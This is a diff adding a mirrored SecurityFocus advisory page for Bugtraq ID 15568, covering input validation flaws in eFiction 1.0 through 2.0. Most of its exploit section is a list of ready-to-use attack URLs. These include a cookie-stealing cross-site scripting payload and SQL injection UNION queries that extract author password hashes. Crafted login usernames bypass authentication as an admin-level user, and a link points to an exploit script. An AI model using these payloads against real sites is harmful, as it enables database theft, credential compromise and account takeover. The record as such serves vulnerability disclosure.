@@ -1,0 +1,102 @@
+#SpeeDr00t@Black Falcon<br>#bid15568<p><b><span style="font-size: 18pt;">eFiction Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15568/info">info</a><br><a href="http://www.securityfocus.com/bid/15568/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15568/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15568/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15568/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15568
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 25 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 25 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				retrogod is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					eFiction Project eFiction 2.0 <br/>
+					
+				
+					eFiction Project eFiction 1.1 <br/>
+					
+				
+					eFiction Project eFiction 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x16000/15568/efiction20_xpl.php">#exploit_efiction20_xpl.php</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following URI have been provided:<br/><br/>http://www.example.com/efiction/titles.php?action=viewlist&amp;let=&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/><br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%200,0,'&lt;script&gt;alert(document.cookie)&lt;/script&gt;'<br/>,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/authors.php?action=viewlist&amp;let='%20UNION%20SELECT%20password,0%20FROM%20fanfiction_authors/*<br/>http://www.example.com/path/authors.php?action=viewlist&amp;let=%27%20UNION%20SELECT%20password,password%20FROM%20efiction_fanfiction_authors/*&amp;offset=0,40/*<br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%200,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/*<br/>http://www.example.com/path/viewstory.php?sid='%20UNION%20SELECT%200,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20fanfiction_authors%20/*<br/>http://www.example.com/path/viewstory.php?sid='%20UNION%20SELECT%200,0,penname,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%200,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%20password,0,0,0,0,0,penname,0,0,0,0,0,0,0,0%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%20penname,0,0,0,0,0,0,0,0,0,password,0,0,0,0%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%200,0,0,0,0,0,0,0,0,0,password,0,0,0,0%20FROM%20efiction_fanfiction_authors%20/*<br/><br/>http://www.example.com/path/viewuser.php?uid='UNION%20SELECT%200,0,0,0,0,0,0,0,0,0,password,0,0,0,0%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/viewstory.php?sid='%20UNION%20SELECT%200,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20efiction_fanfiction_authors%20/*<br/><br/>http://www.example.com/path/viewstory.php?sid='%20UNION%20SELECT%20penname,penname,password,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname,penname%20FROM%20fanfiction_authors%20/*<br/><br/>http://www.example.com/path/titles.php?action=viewlist&amp;let='%20UNION%20SELECT%200,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,penname,0%20FROM%20fanfiction_authors%20/*<br/><br/>username: 'UNION SELECT 'd41d8cd98f00b204e9800998ecf8427e',penname,uid,userskin,level,email FROM fanfiction_authors where level=1/*<br/>password: nothing<br/><br/>username: 'UNION SELECT 'd41d8cd98f00b204e9800998ecf8427e',penname,uid,userskin,level,email,categories FROM fanfiction_authors where level=1/*<br/>password: nothing<br/><br/>username: 'UNION SELECT 'd41d8cd98f00b204e9800998ecf8427e',penname,uid,userskin,level,email,categories,ageconsent FROM fanfiction_authors where level=1/*<br/>password: nothing
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/efiction20_xpl.php">/data/vulnerabilities/exploits/efiction20_xpl.php</a></li>
+</ul>
+</div>
